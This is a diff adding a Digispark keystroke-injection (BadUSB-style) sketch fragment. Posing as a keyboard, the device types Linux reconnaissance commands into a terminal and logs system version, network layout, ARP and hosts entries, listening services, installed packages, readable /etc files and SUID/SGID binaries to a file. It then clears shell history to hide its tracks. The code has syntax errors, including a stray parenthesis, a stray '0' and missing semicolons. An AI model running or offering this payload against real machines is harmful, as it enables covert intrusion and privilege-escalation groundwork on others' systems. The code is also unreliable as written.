@@ -1,0 +1,138 @@
+// dist
+DigiKeyboard.println ("echo 'Distribution Kernel Version:' ' >> info_gathering.txt");)
+DigiKeyboard.println ("cat /etc/issue | cut -c1-13 >> info_gathering.txt");
+
+// uname
+DigiKeyboard.println ("echo 'uname results: ' >> info_gathering.txt");
+DigiKeyboard.println("uname -a >> info_gathering.txt");
+DigiKeyboard.delay(50);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(100);
+
+DigiKeyboard.println ("echo >> info_gathering.txt");
+DigiKeyboard.delay(50);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+DigiKeyboard.delay(50);
+DigiKeyboard.println ("echo >> info_gathering.txt");
+DigiKeyboard.delay(50);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+DigiKeyboard.println ("echo >> info_gathering.txt");
+DigiKeyboard.delay(50);
+DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+DigiKeyboard.delay(50);
+
+// mounted filesystems
+DigiKeyboard.println ("echo 'Mounted filesystems: ' >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+DigiKeyboard.delay(50);
+DigiKeyboard.println ("mount -l >> info_gathering.txt");
+DigiKeyboard.delay(50);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+
+DigiKeyboard.delay(100);
+DigiKeyboard.println ("echo >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50); 
+
+// network config
+DigiKeyboard.println ("echo 'Network Configuration: ' >> info_gathering.txt");
+DigiKeyboard.delay(50);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+DigiKeyboard.println ("ifconfig -a | grep 'Link\|inet' >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+
+
+DigiKeyboard.println ("echo >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+
+// hosts
+DigiKeyboard.println ("echo 'Print Hosts: ' >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+DigiKeyboard.println (" cat /etc/hosts >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+
+//arp
+DigiKeyboard.println ("echo 'Print ARP: ' >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50); 
+DigiKeyboard.println (" arp >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50); 
+DigiKeyboard.println ("echo >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+
+// dev tools
+DigiKeyboard.println ("echo 'Development tools availability: ' >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+DigiKeyboard.println (" which gcc >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+DigiKeyboard.println ("which g++ >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+DigiKeyboard.println (" which python >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+DigiKeyboard.println ("echo >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+DigiKeyboard.println ("echo 'Print TCP/UDP Listening Services: ' >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+DigiKeyboard.println(" netstat -tunlpe >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(300)
+DigiKeyboard.println ("echo >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+
+// installed packages
+DigiKeyboard.println ("echo 'Installed Packages: ' >> info_gathering.txt");
+DigiKeyboard.delay(50);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(200);
+DigiKeyboard.println ("dpkg -l >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+
+DigiKeyboard.delay(300)
+DigiKeyboard.println ("echo >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+
+// readable folders
+DigiKeyboard.println ("echo 'Find Readable Folders in /etc: ' >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+DigiKeyboard.println (" find /etc -user $(id -u) -perm -u=r -o -group $(id -g) -perm -g=r -o -perm -o=r -ls 2> /dev/null >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);0
+DigiKeyboard.println ("echo >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+
+// suid guid files
+DigiKeyboard.println ("echo 'Find SUID and GUID files' >> info_gathering.txt");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+DigiKeyboard.println ("find / -type f -perm -u=s -o -type f -perm -g=s -ls  2> /dev/null >> info_gathering.txt");
+DigiKeyboard.delay(50);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(15000)
+DigiKeyboard.println (" history -c");
+DigiKeyboard.delay(50);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(50);
+DigiKeyboard.println (" exit");
+DigiKeyboard.delay(50);
+
